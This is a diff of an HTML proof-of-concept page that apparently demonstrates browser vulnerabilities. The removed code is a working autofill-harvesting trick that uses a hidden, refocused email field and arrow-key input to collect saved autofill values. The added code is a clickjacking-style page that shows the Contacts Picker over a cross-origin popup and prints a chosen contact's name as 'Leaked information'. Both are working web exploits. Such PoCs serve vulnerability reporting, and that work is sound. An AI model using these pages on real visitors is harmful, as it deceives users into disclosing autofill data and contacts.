@@ -1,46 +1,28 @@
 <!DOCTYPE html>
-<style>
-form.hidden { opacity: 0; }
-
-</style>
-<h1>Hold the DOWN arrow key</h1>
-<form>
-    <input name=email type=text autocomplete=email autofocus>
-    <input type=submit>
-</form>
-<button onclick="document.forms[0].classList.toggle('hidden')">Hide form</button>
-<div id="log" style="position:absolute;left:400px"></div>
-<script>
-var values = [];
-var field = document.forms[0].elements[0];
-var running;
-document.onclick = () => setTimeout(field.focus());
-field.onblur = (e) => setTimeout(field.focus());
-field.onkeydown = function(e) {
-    if (e.keyCode != 40 && e.keyCode != 38) return;
-    if (field.parentElement.className == 'hidden') {
-        this.style.position='absolute';
-        this.style.top='3000px';
-        this.style.left='3000px';
-    }
-
-    if (!running) {
-        running = setInterval(() => { 
-            field.setSelectionRange(0,0);
-            var result = document.execCommand('insertText', false, ' ');
-            var val = field.value.trim();
-            field.value='';
-            if (val == '') return;
-            if (values.indexOf(val) == -1) {
-                values.push(val);
-                var li = document.createElement('li');
-                li.textContent = val;
-                document.getElementById('log').appendChild(li);
+<html lang="en">
+    <head>
+        <title>PoC</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+        <script>
+            onclick = async () => {
+                (async () => {
+                    let contacts = await navigator.contacts.select(["name"], {});
+                    document.write(`
+                        <h1>
+                            <font color="red">Leaked information:</font> ${contacts[0]["name"]}</font>
+                        </h1>
+                    `);
+                })();
+                open("https://www.google.com", "PoC", "_blank");
             }
-        }, 1);
-    }
-}
-
-
-
-</script>
+        </script>
+    </head>  
+    <body>
+        <br><br><br>
+        <center>
+            <h1>Click anywhere on the page to show the Contact dialog over a cross-origin page!</h1>
+        </center>
+    </body>
+  </body>
+</html>
